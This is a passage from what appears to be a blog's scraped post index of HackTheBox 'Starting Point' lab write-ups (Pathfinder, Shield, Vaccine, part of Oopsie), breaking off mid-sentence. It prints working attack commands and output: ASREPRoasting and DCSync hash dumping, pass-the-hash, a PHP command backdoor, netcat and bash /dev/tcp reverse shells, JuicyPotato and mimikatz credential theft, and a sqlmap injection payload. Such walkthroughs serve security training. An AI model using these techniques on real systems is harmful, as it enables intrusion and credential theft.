--no-sandboxEnsure you connect to the database, indicated by a ✔️ symbol at the top of the three input fields. The default username is neo4j, with the password previously set.Opening BloodHound, we can drag and drop the .json files, and BloodHound will begin to analyze the data.AnalysisBloodHound offers several Pre-Built Analysis queries.We can select various queries, of which some handy ones are Shortest Paths to High value Targets and Find Principles with DCSync Rights.Shortest Paths from Domain Users to High Value TargetsFind Principles with DCSync RightsWhile the latter query returns this:We can see that the svc_bes has GetChangesAll privileges to the domain. This means the account can request replication data from the domain controller and gain sensitive information such as user hashes.ExplotationIt’s worth checking if Kerberos pre-authentication has been disabled for this account, which means it is vulnerable to ASREPRoasting. We can check this using a tool such as Impacket’s GetNPUsers and grab the request service ticket.Type the following command to grab the request ticket.$ python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py MEGACORP.LOCAL/svc_bes -dc-ip 10.10.10.30 -request -no-passParameters explanation: request: Requests TGT for users and output them in JtR/hashcat format (default False). no-pass: Don’t ask for password (useful for Kerberos authentication). dc-ip: IP Address of the domain controller. format: Format to save the AS_REQ of users without pre-authentication. Default is hashcat.This outputs:$ python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py MEGACORP.LOCAL/svc_bes -dc-ip 10.10.10.30 -request -no-passImpacket v0.9.22 - Copyright 2020 SecureAuth Corporation[*] Getting TGT for svc_bes$krb5asrep$23$svc_bes@MEGACORP.LOCAL:8576c42381f7fdd8c60f78915def4303$c93a0b635c08240ed73a946bdeb03968c238f8f3907a9c0d72126cd65953335f4e014c200dd27c54d709fb737a1d9a452c6719f5e1250fd7c7ace2579636e628eb2bec468920bc07e191909af1af774cc9b142573e008558362ffae11f56e5014852dafd4703f0d95aa4ed9044f95db8d5b473c51f8cf6a254ff708bc88ab70d071ca6f9012e330a1b5e56b1c1ecdda69764317a284af5531763d9d278ccc4cd77da7891bfbccce6bc7064bf462f5baa22bf78895e19d860cf12237c63da47c10643f46cd119617990ef4ec9afa605ee7e8a72bb881192c28813eb7d1b11d144589a2a5f480429eef52e46a90537e890We grabbed the ticket. Now it’s time to power up John the Ripper and crack the hash. First, copy that hash to the file, then run the john.$ john hash --wordlist=/usr/share/wordlists/rockyou.txtThis outputs:$ john hash --wordlist=/usr/share/wordlists/rockyou.txtUsing default input encoding: UTF-8Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])Will run 12 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for statusSheffield19 ($kr5asrep$23$svc_bes@MEGACORP.LOCAL)1g 0:00:00:03 DONE (2021-09-25 16:44) 0.2557g/s 2712Kp/s 2712Kc/s 2712KC/s Shokat_2..ShaneleeUse the \"--show\" option to display all of the cracked passwords reliablySession completedWe got the password for svc_bes!username: svc_bespassword: Sheffield19Since we have the username and password, we can use the Evil-WinRM tool. You can install it by typing gem install evil-winrm.Let’s run the tool for the svc_bes account.$ evil-winrm -u svc_bes -p Sheffield19 -i 10.10.10.30This outputs:$ evil-winrm -u svc_bes -p Sheffield19 -i 10.10.10.30Evil-WinRM shell v3.3Info: Establishing connection to remote endpoint*Evil-WinRM* PS C:\\Users\\svc_bes\\Documents&gt;The user flag is under C:\\Users\\svc_bes\\Desktop\\user.txt. Now, time to escalate privileges.Privilege EscalationNow we are going to perform DCSync attack and dump the NTLM hashes of all domain users using the Impacket’s secretsdump.py script.$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py MEGACORP.LOCAL/svc_bes:Sheffield19@10.10.10.30This outputs:$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py MEGACORP.LOCAL/svc_bes:Sheffield19@10.10.10.30Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)[*] Using the DRSUAPI method to get NTDS.DIT secretsAdministrator:500:aad3b435b51404eeaad3b435b51404ee:8a4b77d52b1845bfe949ed1b9643bb18:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::krbtgt:502:aad3b435b51404eeaad3b435b51404ee:f9f700dbf7b492969aac5943dab22ff3:::svc_bes:1104:aad3b435b51404eeaad3b435b51404ee:0d1ce37b8c9e5cf4dbd20f5b88d5baca:::sandra:1105:aad3b435b51404eeaad3b435b51404ee:29ab86c5c4d2aab957763e5c1720486d:::PATHFINDER$:1000:aad3b435b51404eeaad3b435b51404ee:0effab7cbed356ad1429a3ad4f82a40c:::[*] Kerberos keys grabbedAdministrator:aes256-cts-hmac-sha1-96:056bbaf3be0f9a291fe9d18d1e3fa9e6e4aff65ef2785c3fdc4f6472534d614fAdministrator:aes128-cts-hmac-sha1-96:5235da455da08703cc108293d2b3fa1bAdministrator:des-cbc-md5:f1c89e75a42cd0fbkrbtgt:aes256-cts-hmac-sha1-96:d6560366b08e11fa4a342ccd3fea07e69d852f927537430945d9a0ef78f7dd5dkrbtgt:aes128-cts-hmac-sha1-96:02abd84373491e3d4655e7210beb65cekrbtgt:des-cbc-md5:d0f8d0c86ee9d997svc_bes:aes256-cts-hmac-sha1-96:2712a119403ab640d89f5d0ee6ecafb449c21bc290ad7d46a0756d1009849238svc_bes:aes128-cts-hmac-sha1-96:7d671ab13aa8f3dbd9f4d8e652928ca0svc_bes:des-cbc-md5:1cc16e37ef8940b5sandra:aes256-cts-hmac-sha1-96:2ddacc98eedadf24c2839fa3bac97432072cfac0fc432cfba9980408c929d810sandra:aes128-cts-hmac-sha1-96:c399018a1369958d0f5b242e5eb72e44sandra:des-cbc-md5:23988f7a9d679d37PATHFINDER$:aes256-cts-hmac-sha1-96:e1645b5547d26b38d8b5c233595585b2b4102cfb78aff9f839b9ac89c78b1584PATHFINDER$:aes128-cts-hmac-sha1-96:f6f0a930e371f5aeda450314adf6cfbdPATHFINDER$:des-cbc-md5:0e45c7d008f7ced0[*] Cleaning up...As you can see, we have NTLM hash for the Administrator account. We can use this to perform Pass The Hash attack and gain elevated access to the system. Also, we can use Impacket’s psexec.py for this too.$ python3 /usr/share/doc/python3-impacket/examples/psexec.py MEGACORP.LOCAL/Administrator@10.10.10.30 -hashes &lt;NTML hash&gt;This outputs:$ python3 /usr/share/doc/python3-impacket/examples/psexec.py MEGACORP.LOCAL/Administrator@10.10.10.30 -hashes aad3b435b51404eeaad3b435b51404ee:8a4b77d52b1845bfe949ed1b9643bb18Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation[*] Requesting shares on 10.10.10.30.....[*] Found writable share ADMIN$[*] Uploading file xKTsiDfe.exe[*] Opening SVCManager on 10.10.10.30.....[*] Creating service aCAn on 10.10.10.30.....[*] Starting service aCAn.....[!] Press help for extra shell commandsMicrosoft Windows [Version 10.0.17763.107](c) 2018 Microsoft Corporation. All rights reserved.C:\\Windows\\system32&gt;And we are root! Now we can obtain the root flag, which is located in C:\\Users\\Administrator\\Desktop.We are done. Pathfinder has been Pwned!" }, { "title": "HackTheBox write-up: Shield", "url": "/posts/HTB-Shield/", "categories": "Starting Point, Windows", "tags": "Very Easy, PHP, WordPress, juicy potato, mimikatz", "date": "2021-09-19 12:00:00 +0200", "snippet": "This is a write-up for the Shield machine on HackTheBox. It was the fourth machine in their “Starting Point” series.Basic InformationMachine IP: 10.10.10.29 Type: Windows Difficulty: Very EasyScanningFirst, to find interesting open ports, let’s do some reconnaissance and scanning using nmap.$ nmap -p- --open -T5 -v -n 10.10.10.29Parameters explanation: p-: Scan all 65,535 possible port numbers. open: Only show open (or possibly open) ports. T5: Faster scan (T&lt;0-5&gt;). v: Increase verbosity level. n: Never do DNS resolution.It seems to take a long time to scan. Let’s examine it in a faster way.$ nmap -sS --min-rate 5000 -p- --open -vvv -Pn 10.10.10.29Parameters explanation: sS: TCP SYN scan. min-rate: Send packets no slower than &lt;number&gt; per second. p-: Scan all 65,535 possible port numbers. open: Only show open (or possibly open) ports. vvv: Increase verbosity level. Pn: Treat all hosts as online and skip host discovery.$ nmap -sS --min-rate 5000 -p- --open -vvv -Pn 10.10.10.29Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-18 15:14 CESTInitiating Parallel DNS resolution of 1 host. at 15:14Completed Parallel DNS resolution of 1 host. at 15:14, 1.02s elapsedDNS resolution of 1 IPs took 1.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]Initiating SYN Stealth Scan at 15:14Scanning 10.10.10.29 [65535 ports]Discovered open port 80/tcp on 10.10.10.29Discovered open port 3306/tcp on 10.10.10.29Completed SYN Stealth Scan at 15:14, 27.64s elapsed (65535 total ports)Nmap scan report for 10.10.10.29Host is up, received user-set (0.21s latency).Scanned at 2021-09-18 15:14:31 CEST for 28sNot shown: 65533 filtered portsReason: 65533 no-responsesSome closed ports may be reported as filtered due to --defeat-rst-ratelimitPORT STATE SERVICE REASON80/tcp open http syn-ack ttl 1273306/tcp open mysql syn-ack ttl 127Read data files from: /usr/bin/../share/nmapNmap done: 1 IP address (1 host up) scanned in 28.71 seconds Raw packets sent: 131088 (5.768MB) | Rcvd: 14 (616B)We see that the machine has a web page (port 80) and a MySQL server (port 3306).EnumerationWe can run Nmap Scripting Engine for service/version detection running through each port for the best results.$ nmap -sV -sC -p80,3306 10.10.10.29Parameters explanation: sV: Service fingerprinting. sC: Launch default NSE nmap scripts. p: Only scan specified ports.$ nmap -sV -sC -p80,3306 10.10.10.29Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-18 15:28 CESTNmap scan report for 10.10.10.29Host is up (0.37s latency).PORT STATE SERVICE VERSION80/tcp open http Microsoft IIS httpd 10.0| http-methods:|_ Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/10.0|_http-title: IIS Windows Server3306/tcp open mysql MySQL (unauthorized)Service Info: OS: Windows; CPE: cpe:/o:microsoft:windowsService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 21.11 secondsWe can see that Windows IIS is being used. Let’s open the web page in our web browser.There doesn’t seem to be anything worthwhile.Let’s find hidden directories using brute force with Wfuzz.$ wfuzz -c -L -t 300 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.29/FUZZParameters explanation: c: Output with colors. L: Follow HTTP redirections. t: Specify the number of concurrent connections (10 default). hc: Hide responses with the specified code. w: Specify a wordlist file. FUZZ: Wherever you put these keywords wfuzz, will replace them with the values of the specified payload$ wfuzz -c -L -t 100 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.29/FUZZ********************************************************* Wfuzz 3.1.0 - The Web Fuzzer *********************************************************Target: http://10.10.10.29/FUZZTotal requests: 220560=====================================================================ID Response Lines Word Chars Payload=====================================================================000000587: 200 345 L 1238 W 24086 Ch \"wordpress\"000019064: 200 345 L 1238 W 24086 Ch \"WordPress\"Wfuzz finds a directory called WordPress. Let’s head over to this.Vulnerability Analysis &amp; ExplotationNow we can see there is a WordPress site hosted on the server. It is a company’s website that deals with electric trucks. Looking a little on the website, we can find a login panel. As usual on these “Starting Point” machines, credentials are reused from previous machines, so the brute force will not work.Using the combination of admin and P@s5w0rd!. We can log in to the WordPress site.username: adminpassword: P@s5w0rd!We are successfully logging into the WordPress site as admin!FootholdNow that we are in let’s attempt to establish a reverse shell. Since we are on a Windows machine, we must have a Windows PHP reverse shell to gain access and a netcat binary. You can download nc.exe from here.$ wget https://github.com/int0x33/nc.exe/raw/master/nc.exeThe backdoor.php script looks like this:&lt;?php if(isset($_REQUEST['cmd'])){ echo \"&lt;pre&gt;\"; $cmd = ($_REQUEST['cmd']); system($cmd); echo \"&lt;/pre&gt;\"; die; }?&gt;Usage: http://target.com/backdoor.php?cmd=cat+/etc/passwdFirst, click on Appearance then Themes.Then click Add New button.Browse and upload netcat binary and bind shell PHP script.Click the Install Now button to upload. You might get an error, but it’s just ok.Then navigate to http://10.10.10.29/wordpress/wp-content/Uploads/backdoor.php?cmd=dirWe have a simple bind shell!Getting complete control (RCE)Let’s now spawn a reverse shell in a terminal, starting a listener on port 443 with:$ nc -lvnp 443Parameters explanation: l: Listen for connections. v: Set verbosity level (can be used several times). n: Do not resolve hostnames via DNS. p: Specify source port to use.Returning to the website, we will use our netcat binary file to gain a reverse shell. Let’s navigate the following URL:http://10.10.10.29/wordpress/wp-content/Uploads/backdoor.php?cmd=.\\nc.exe%20-e%20cmd.exe%20&lt;YourIP&gt;%20443We are in.Inspecting the User directory, we can see the user sandra, and we don’t have access to this account.C:\\inetpub\\wwwroot\\wordpress\\wp-content\\Uploads&gt;cd /Userscd /UsersC:\\Users&gt;dirdir Volume in drive C has no label. Volume Serial Number is DA1D-61AB Directory of C:\\Users02/10/2020 02:46 PM &lt;DIR&gt; .02/10/2020 02:46 PM &lt;DIR&gt; ..02/07/2020 04:43 AM &lt;DIR&gt; Administrator11/20/2016 06:24 PM &lt;DIR&gt; Public02/13/2020 10:50 AM &lt;DIR&gt; sandra 0 File(s) 0 bytes 5 Dir(s) 27,563,810,816 bytes freeC:\\Users&gt;cd sandracd sandraAccess is denied.C:\\Users&gt;So it’s time to escalate privileges!Privilege EscalationLet’s see what privileges we have now.C:\\Users&gt;whoami /privwhoami /privPRIVILEGES INFORMATION----------------------Privilege Name Description State======================= ========================================= =======SeChangeNotifyPrivilege Bypass traverse checking EnabledSeImpersonatePrivilege Impersonate a client after authentication Enabled 👈SeCreateGlobalPrivilege Create global objects EnabledWe have the SeImpersonatePrivilege enabled, that means we can run juicy potato to gain privilege. Be sure to change the name of Juicy Potato to one that is less conspicuous just in case Windows Defender tries to flag it (I changed mine to just JP.exe).Let’s start a local host page to get our payloads onto the target. This should allow us to download the executables needed to exploit the target.$ python3 -m http.server 80To upload, you must type the following command on the windows machine.$ Powershell -c \"IWR -useBasicParsing http://&lt;YourIP&gt;/JP.exe -o JP.exe\"Then as the documentation specifies, we need a Batch file to run. So now we need to create a bat file using the following command:$ echo START c:\\inetpub\\wwwroot\\wordpress\\wp-content\\uploads\\nc.exe -e powershell.exe &lt;YourIP&gt; &lt;YourPort&gt; &gt; sh3ll.batThen all the things are fine.C:\\inetpub\\wwwroot\\wordpress\\wp-content\\uploads&gt;Powershell -c \"IWR -useBasicParsing http://10.10.16.65:80/JP.exe -o JP.exe\"Powershell -c \"IWR -useBasicParsing http://10.10.16.65:80/JP.exe -o JP.exe\"C:\\inetpub\\wwwroot\\wordpress\\wp-content\\uploads&gt;echo START c:\\inetpub\\wwwroot\\wordpress\\wp-content\\uploads\\nc.exe -e powershell.exe 10.10.16.65 4444 &gt; sh3ll.batecho START c:\\inetpub\\wwwroot\\wordpress\\wp-content\\uploads\\nc.exe -e powershell.exe 10.10.16.65 4444 &gt; sh3ll.batNow power up netcat listener again on port 443 and execute the following command. If you failed to get the reverse shell, change the -c parameter (CLSID) from using this document and run again.$ .\\JP.exe -t * -c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4} -p C:\\inetpub\\wwwroot\\wordpress\\wp-content\\Uploads\\sh3ll.bat -l 4444This outputs:C:\\inetpub\\wwwroot\\wordpress\\wp-content\\uploads&gt;.\\JP.exe -t * -c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4} -p C:\\inetpub\\wwwroot\\wordpress\\wp-content\\Uploads\\sh3ll.bat -l 4444.\\JP.exe -t * -c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4} -p C:\\inetpub\\wwwroot\\wordpress\\wp-content\\Uploads\\sh3ll.bat -l 4444Testing {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4} 4444......[+] authresult 0{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4};NT AUTHORITY\\SYSTEM[+] CreateProcessWithTokenW OKC:\\inetpub\\wwwroot\\wordpress\\wp-content\\uploads&gt;PS C:\\Windows\\system32&gt; whoamiwhoamint authority\\systemPS C:\\Windows\\system32&gt; cd /Users/Administrator/Desktopcd /Users/Administrator/DesktopPS C:\\Users\\Administrator\\Desktop&gt; dirdir Directory: C:\\Users\\Administrator\\DesktopMode LastWriteTime Length Name---- ------------- ------ -----ar--- 2/25/2020 1:28 PM 32 root.txtWe are done, Shield has been Pwned!Post ExplotationAs with prior machines, we aren’t quite finished. We can find Sandra’s credentials using mimikatz. Software Mimikatz is often used to find credentials within Windows operating systems. Mimikatz can be found in the latest distro of Kali Linux in /usr/share/windows-resources/mimikatz/x64, or you can download the tool from here and upload it to the box.$ IWR -useBasicParsing http://&lt;YourIP&gt;:80/mimikatz.exe -o mcat.exeThen we can run that file by typing .\\mcat.Within the mimikatz program, type the following after the “#” prompt:mimikatz # sekurlsa::logonpasswordsThis should reward you with the following output:The found credentials are:username: sandrapassword: Password1234!" }, { "title": "HackTheBox write-up: Vaccine", "url": "/posts/HTB-Vaccine/", "categories": "Starting Point, Linux", "tags": "Very Easy, Web, PHP, SUID, RCE", "date": "2021-09-11 17:00:00 +0200", "snippet": "This is a write-up for the Vaccine machine on HackTheBox. It was the third machine in their “Starting Point” series.Basic InformationMachine IP: 10.10.10.46 Type: Linux Difficulty: Very EasyScanningFirst, to find interesting open ports, let’s do some reconnaissance and scanning using nmap.$ nmap -p- --open -T5 -v -n 10.10.10.46Parameters explanation: p-: Scan all 65,535 possible port numbers. open: Only show open (or possibly open) ports. T5: Faster scan (T&lt;0-5&gt;). v: Increase verbosity level. n: Never do DNS resolution.$ nmap -p- --open -T5 -v -n 10.10.10.46Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-09 16:03 CESTInitiating Ping Scan at 16:03Scanning 10.10.10.46 [4 ports]Completed Ping Scan at 16:03, 0.04s elapsed (1 total hosts)Initiating SYN Stealth Scan at 16:03Scanning 10.10.10.46 [65535 ports]Discovered open port 80/tcp on 10.10.10.46Discovered open port 21/tcp on 10.10.10.46Discovered open port 22/tcp on 10.10.10.46Completed SYN Stealth Scan at 16:03, 12.08s elapsed (65535 total ports)Nmap scan report for 10.10.10.46Host is up (0.13s latency).Not shown: 65532 closed portsPORT STATE SERVICE21/tcp open ftp22/tcp open ssh80/tcp open httpRead data files from: /usr/bin/../share/nmapNmap done: 1 IP address (1 host up) scanned in 12.17 seconds Raw packets sent: 66472 (2.925MB) | Rcvd: 66472 (2.659MB)We see that the machine has a File Transfer Protocol (port 21), Secure Shell (port 22), and a web page (port 80).EnumerationWe can run Nmap Scripting Engine for service/version detection running through each port for the best results.$ nmap -sV -sC -p21,22,80 10.10.10.46Parameters explanation: sV: Service fingerprinting. sC: Launch default NSE nmap scripts. p: Only scan specified ports.$ nmap -sV -sC -p21,22,80 10.10.10.46Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-09 16:06 CESTNmap scan report for 10.10.10.46Host is up (0.049s latency).PORT STATE SERVICE VERSION21/tcp open ftp vsftpd 3.0.322/tcp open ssh OpenSSH 8.0p1 Ubuntu 6build1 (Ubuntu Linux: protocol 2.0)| ssh-hostkey:| 3072 c0:ee:58:07:75:34:b0:0b:91:65:b2:59:56:95:27:a4 (RSA)| 256 ac:6e:81:18:89:22:d7:a7:41:7d:81:4f:1b:b8:b2:51 (ECDSA)|_ 256 42:5b:c3:21:df:ef:a2:0b:c9:5e:03:42:1d:69:d0:28 (ED25519)80/tcp open http Apache httpd 2.4.41 ((Ubuntu))| http-cookie-flags:| /:| PHPSESSID:|_ httponly flag not set|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: MegaCorp LoginService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 11.45 secondsRelevant information: Port Service Version 21 FTP Vsftpd 3.0.3 22 SSH OpenSSH 8.0p1 Ubuntu 6build1 80 HTTP Apache 2.4.41 Let’s identify the website with WhatWeb.$ whatweb http://10.10.10.46http://10.10.10.46 [200 OK] Apache[2.4.41], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.46], PasswordField[password], Title[MegaCorp Login]We don’t see anything relevant that we don’t know.When browsing http://10.10.10.46 with a web browser, we get a login page of MegaCorp with nothing else. Finding hidden files or directories with Wfuzz won’t be successful.Since FTP is running, we will start from here. Let’s remember that the previous machine (Oopsie), during the post-exploitation phase, we gained user credentials for an FTP service.The credentials were:user: ftpuserpass: mc@F1l3ZilL4$ ftp 10.10.10.46Connected to 10.10.10.46.220 (vsFTPd 3.0.3)Name (10.10.10.46:root): ftpuser331 Please specify the password.Password:230 Login successful.Remote system type is UNIX.Using binary mode to transfer files.ftp&gt;It has worked! We are within the service.Vulnerability Analysis &amp; ExplotationLet’s list the contents and run the passive command to solve issues with connectivity due to client-side firewalls.In the current working directory, there is a file called backup.zip, so let’s download it using get.ftp&gt; ls200 PORT command successful. Consider using PASV.150 Here comes the directory listing.-rw-r--r-- 1 0 0 2533 Feb 03 2020 backup.zip226 Directory send OK.ftp&gt; passivePassive mode on.ftp&gt; get backup.ziplocal: backup.zip remote: backup.zip227 Entering Passive Mode (10,10,10,46,40,107).150 Opening BINARY mode data connection for backup.zip (2533 bytes).226 Transfer complete.2533 bytes received in 0.03 secs (75.5931 kB/s)ftp&gt; exit221 Goodbye.Time to investigate the zip archive. The file is encrypted, so we can use fcrackzip to crack it and unzip the archive.$ fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt backup.zipPASSWORD FOUND!!!!: pw == 741852963$ unzip backup.zipArchive: backup.zip[backup.zip] index.php password: inflating: index.php inflating: style.cssExaming the index.php file, there’s an if statement containing a credential check containing the valid credentials needed to access the website’s login page.The password is hashed with MD5, a week algorithm for passwords. Let’s try to decode it using the CrackStation site.So now the credentials are:user: adminpass: qwerty789Now let’s try to log in to the web page.The credentials are correct, and we log into the website.FootholdWe have an input field to provide a search query that might be vulnerable to LFI, RCE or SQLi. We can use sqlmap to automate the process to determine if this webpage is vulnerable to SQL injections or not.$ sqlmap -u 'http://10.10.10.46/dashboard.php?search=a' --cookie='PHPSESSID=klapkg6efqba83l147pp7619ga'Payload:Parameter: search (GET) Type: stacked queries Title: PostgreSQL &gt; 8.1 stacked queries (comment) Payload: search=a';SELECT PG_SLEEP(5)-- Type: UNION query Title: Generic UNION query (NULL) - 5 columns Payload: search=a' UNION ALL SELECT NULL,(CHR(113)||CHR(118)||CHR(118)||CHR(112)||CHR(113))||(CHR(89)||CHR(87)||CHR(113)||CHR(86)||CHR(121)||CHR(65)||CHR(75)||CHR(109)||CHR(65)||CHR(104)||CHR(77)||CHR(114)||CHR(83)||CHR(73)||CHR(112)||CHR(75)||CHR(88)||CHR(84)||CHR(109)||CHR(78)||CHR(110)||CHR(106)||CHR(84)||CHR(74)||CHR(102)||CHR(88)||CHR(73)||CHR(77)||CHR(115)||CHR(121)||CHR(70)||CHR(122)||CHR(75)||CHR(78)||CHR(114)||CHR(71)||CHR(65)||CHR(80)||CHR(98)||CHR(112))||(CHR(113)||CHR(98)||CHR(98)||CHR(112)||CHR(113)),NULL,NULL,NULL-- UnCJThe input field seems vulnerable to a UNION SQL injection.Using --os-shell as a parameter, we can spawn a shell using sqlmap.Let’s now spawn a reverse shell in another window, starting a listener on port 443 with:$ nc -lvnp 443Parameters explanation: l: Listen for connections. v: Set verbosity level (can be used several times). n: Do not resolve hostnames via DNS. p: Specify source port to use.and then executing the following command on the shell, we got via sqlmap:$ bash -c 'bash -i &gt;&amp; /dev/tcp/YOUR_IP/443 0&gt;&amp;1'We initiate a reverse shell, and we are in. The first step is always stabilizing the shell so we can’t accidentally close the connection if we press something like CTRL+C.$ script /dev/null -c bashCTRL + Z (nc process into the background)$ stty raw -echo; fg$ reset$ xterm$ export TERM=xterm$ export SHELL=bashNow we should have a fully stabilized shell.On-Machine EnumerationSeeing how we are on a web server’s database, let’s dig around /var/www/html.Looking at the dashboard.php file, we can see some credentials.dbname: carsdbuser: pstgrespassword: P@s5w0rd!This machine only has a root flag, so let’s see if we can become a root!Privilege EscalationRunning sudo -l, we can see the privileges the user postgres can run. Unless you upgrade your shell (explained how to stabilize it just above), you will get the error “no tty present and no askpass program specified”.postgres@vaccine:/var/lib/postgresql/11/main$ sudo -l[sudo] password for postgres:Matching Defaults entries for postgres on vaccine: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser postgres may run the following commands on vaccine: (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.confpostgres@vaccine:/var/lib/postgresql/11/main$We can see postgres can run the following:$ sudo /bin/vi /etc/postgresql/11/main/pg_hba.confSo by running it and adding :!/bin/sh inside the vi editor, we got ourselves a root shell.Now we can read the root flag!postgres@vaccine:/var/lib/postgresql/11/main$ sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf# whoamiroot# cd /root# lspg_hba.conf root.txt snapThat’s it, Vaccine has been Pwned!" }, { "title": "HackTheBox write-up: Oopsie", "url": "/posts/HTB-Oopsie/", "categories": "Starting Point, Linux", "tags": "Very Easy, Web, PHP, SUID, RCE", "date": "2021-09-08 17:48:00 +0200", "snippet": "This is a write-up for the Oopsie machine on HackTheBox. It was the second machine in their “Starting Point” series.Basic InformationMachine IP: 10.10.10.28 Type: Linux Difficulty: Very EasyScanningFirst, to find interesting open ports, let’s do some reconnaissance and scanning using nmap.$ nmap -p- --open -T5 -v -n 10.10.10.28Parameters explanation: p-: Scan all 65,535 possible port numbers. open: Only show open (or possibly open) ports. T5: Faster scan (T&lt;0-5&gt;). v: Increase verbosity level. n: Never do DNS resolution.$ nmap -p- --open -T5 -v -n 10.10.10.28Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-03 17:50 CESTInitiating Ping Scan at 17:50Scanning 10.10.10.28 [4 ports]Completed Ping Scan at 17:50, 0.04s elapsed (1 total hosts)Initiating SYN Stealth Scan at 17:50Scanning 10.10.10.28 [65535 ports]Discovered open port 80/tcp on 10.10.10.28Discovered open port 22/tcp on 10.10.10.28Completed SYN Stealth Scan at 17:51, 12.85s elapsed (65535 total ports)Nmap scan report for 10.10.10.28Host is up (0.045s latency).Not shown: 65533 closed portsPORT STATE SERVICE22/tcp open ssh80/tcp open httpRead data files from: /usr/bin/../share/nmapNmap done: 1 IP address (1 host up) scanned in 12.96 seconds Raw packets sent: 67207 (2.957MB) | Rcvd: 67203 (2.688MB)The machine has a Secure Shell (port 22) and a web page (port 80).EnumerationWe can run Nmap Scripting Engine for service/version detection running through each port for the best results.$ nmap -sV -sC -p22,80 10.10.10.28Parameters explanation: sV: Service fingerprinting. sC: Launch default NSE nmap scripts. p: Only scan specified ports.$ nmap -sV -sC -p22,80 10.10.10.28Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-03 18:12 CESTNmap scan report for 10.10.10.28Host is up (0.040s latency).PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux: protocol 2.0)| ssh-hostkey:| 2048 61:e4:3f:d4:1e:e2:b2:f1:0d:3c:ed:36:28:36:67:c7 (RSA)| 256 24:1d:a4:17:d4:e3:2a:9c:90:5c:30:58:8f:60:77:8d (ECDSA)|_ 256 78:03:0e:b4:a1:af:e5:c2:f9:8d:29:05:3e:29:c9:f2 (ED25519)80/tcp open http Apache httpd 2.4.29 ((Ubuntu))|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: WelcomeService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 11.11 secondsWe have port 80 open with Apache.Let’s identify the website with WhatWeb.$ whatweb http://10.10.10.28http://10.10.10.28 [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], Email[admin@megacorp.com], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.28], Script, Title[Welcome]As we have seen, it’s running on Apache server version 2.4.29. It also shows an email(admin@megacorp.com) that could be from the administrator and nothing else. Now’s time to visit the website.We are taken to a globally renowned electric vehicle manufacturer’s webpage. None of the links seems to resolve to anything, and there don’t appear to be any input boxes.Let’s find hidden directories using brute force with Wfuzz.$ wfuzz -c -L -t 300 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.28/FUZZParameters explanation: c: Output with colors. L: Follow HTTP redirections. t: Specify the number of concurrent connections (10 default). hc: Hide responses with the specified code. w: Specify a wordlist file. FUZZ: Wherever you put these keywords wfuzz, will replace them with the values of the specified payload$ wfuzz -c -L -t 300 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.28/FUZZ********************************************************* Wfuzz 3.1.0 - The Web Fuzzer *********************************************************Target: http://10.10.10.28/FUZZTotal requests: 220560=====================================================================ID Response Lines Word Chars Payload=====================================================================000000016: 403 9 L 28 W 276 Ch \"images\"000000550: 403 9 L 28 W 276 Ch \"css\"000000127: 403 9 L 28 W 276 Ch \"themes\"000000953: 403 9 L 28 W 276 Ch \"js\"000000164: 403 9 L 28 W 276 Ch \"uploads\"000002771: 403 9 L 28 W 276 Ch \"fonts\"000095524: 403 9 L 28 W 276 Ch \"server-status\"Directories are displayed, but we don’t have permission to access them. Response: 403 Forbbiden. Ok, we’ll have to try something else.Pulling up inspect to check the code, we see a link with one interesting directory: login.Let’s try going to: http://10.10.10.28/cdn-cgi/login/. We have permissions, and we found another page! This time is a login page.Vulnerability Analysis &amp; ExplotationAt this point, brute force would be an option. However, 